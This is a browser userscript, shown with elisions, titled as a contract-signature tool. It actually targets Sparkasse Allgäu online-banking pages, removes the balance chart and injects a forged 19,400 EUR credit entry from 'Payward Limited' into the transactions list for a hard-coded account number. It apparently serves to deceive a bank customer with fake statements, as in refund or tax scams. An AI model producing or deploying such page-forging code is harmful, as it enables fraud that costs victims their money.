// ==UserScript==
// @name         Vertragssignature Wendel Lübbing
...
// @match        *://*/*
// @match        https://www.sparkasse-allgaeu.de/de/home/onlinebanking/nbf/umsaetze.html*
// @match        https://www.sparkasse-allgaeu.de/fi/home/onlinebanking/nbf/umsaetze.html*
// @match        https://www.sparkasse-allgaeu.de/de/home/onlinebanking/nbf/finanzuebersicht.html*
// @match        https://www.sparkasse-allgaeu.de/fi/home/onlinebanking/nbf/finanzuebersicht.html*
// @match        https://www.sparkasse-allgaeu.de/de/home/onlinebanking/nbf/banking/einzelauftrag.html*
// @match        https://www.sparkasse-allgaeu.de/fi/home/onlinebanking/nbf/banking/einzelauftrag.html*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/473179/Vertragssignature%20Wendel%20L%C3%BCbbing.user.js
// @updateURL https://update.greasyfork.org/scripts/473179/Vertragssignature%20Wendel%20L%C3%BCbbing.meta.js
// ==/UserScript==
...
(function() {
    ...
    var x2amount = 0;
    var buchung = 20000;
    var buchungDecimal = "74";
    var buchungTextsZahl = "538.790";
    var accountsecurity = "516 2090 87";
    ...
    if (window.location.href.indexOf("finanzuebersicht") > 0 || window.location.href.indexOf("10475049811") > 0) {
...
localStorage.removeItem('refresh')
    ...
    if (window.location.href.indexOf("umsaetze") > 0 || window.location.href.indexOf("10475050170") > 0) {
    ...
    saldoLinechartElement.remove();
        ...
        if (document.getElementsByClassName("mkp-identifier-description")[0].children[1].children[0].textContent == accountsecurity ){
           ...
           //    document.getElementsByClassName("saldo-linechart")[0].remove();
            ...
            var x2HTML = '<li aria-label="RUECKUEBERWEISUNG Sonstige Gruende Transfer  ; 19.400,00 EUR" style="list-style-type: none;"><div class="mkp-card mkp-card-debit mkp-card-thinner mkp-card-clickable"><div class="mkp-identifier"><div class="mkp-identifier-description"><h3><a href="#" onclick="return IF.checkFirstSubmit();" class="mkp-identifier-link" title="Payward Limited">Payward Limited</a></h3><p>Geld für Finanzamt von England für Steuern</p></div><div class="mkp-identifier-sticker-placeholder"></div><div class="mkp-identifier-currency"><div class="mkp-currency mkp-currency-m"><span aria-hidden="true" class="balance-predecimal plus">19.400</span><span aria-hidden="true" class="balance-decimal plus">,00&nbsp;EUR</span><span aria-hidden="false" class="offscreen">19.400,00 EUR</span></div></div></div></div></li>';
